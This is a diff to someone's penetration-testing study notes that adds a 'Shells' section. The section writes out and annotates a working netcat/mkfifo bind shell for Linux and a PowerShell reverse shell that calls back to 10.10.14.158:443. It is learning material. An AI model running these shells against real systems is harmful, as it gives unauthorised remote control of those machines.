@@ -1,4 +1,5 @@
 - [Definitions](#definitions)
+  - [Shells](#shells)
 - [Enumeration](#enumeration)
   - [Online presence](#online-presence)
   - [DNS](#dns)
@@ -31,7 +32,6 @@
     - [Blue Team](#blue-team)
     - [Azure](#azure)
 
-
 ## Definitions
 - **Attack Vector**: tool, technique method USED to attack
   - weapons, phishing, DOS, Web drive-by, Flaws in browser, unpachecksecd vulnerability
@@ -46,7 +46,39 @@
   - Disable macros
   - [Microsoft Attack surface reduction (ASR) rules reference](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
   - patch software
-  
+
+### Shells
+- **Understanding the Command**
+```
+# Linux
+## Create listener
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234 > /tmp/f
+
+1. rm -f /tmp/f = remove the file /tmp/f if exists (-f)
+2. ; = sequential execution
+3. mkfifo /tmp/f = create named pipe
+4. cat /tmp/f | = concatenates the FIFO named pipe file 
+5. | = connects stdout to stdin of the commands
+6. /bin/bash -i 2>&1 | = specifiy the bash interactive (-i) + standard error data stream (2) $ standar output data stream (1) redirected to the next command
+7. nc -l $TARGET 1234 > /tmp/f = send the result to nc, output sent to /tmp/f that uses bbash sehll waiting for the connection
+
+# Windows
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+1. powershell -nop -c = powershell with no profile (nop) and execute command block (-c)
+2. $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) = sets variable $client, create object System.Net.Socket.TCPCLIENT
+3. ; = sequential execution
+4. $stream = $client.GetStream() = set $stream to $client, GetStream uses for network communication
+5. [byte[]]$bytes = 0..65535|%{0} = byte type array [], returns 65535 zeros as values. Empty byte stream that is sent to TCP listener
+7. while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) = loop using the $bytes
+8. {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) = sets $data to ASCII enconding. Encode $byte stream to ASCII.
+9. $sendback = (iex $data 2>&1 | Out-String ) = set $sendback to the Invoke-Expresion (iex) to $data. Standar error+ouput to the Out-String which cnverts input objects into strings
+10. $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ' = $sendback2 is $sndback + string PS + current directory = the shell will be in the current directory
+11. $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; =  sets $sendbyte to ASCI enconded byte stream that use TCP client to initiate PS session with NC
+12. $client.Close() = to be used when the connection is closes
+```
+- Also as [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
 ## Enumeration
 - Infrastrcuture-based
 - Host-based
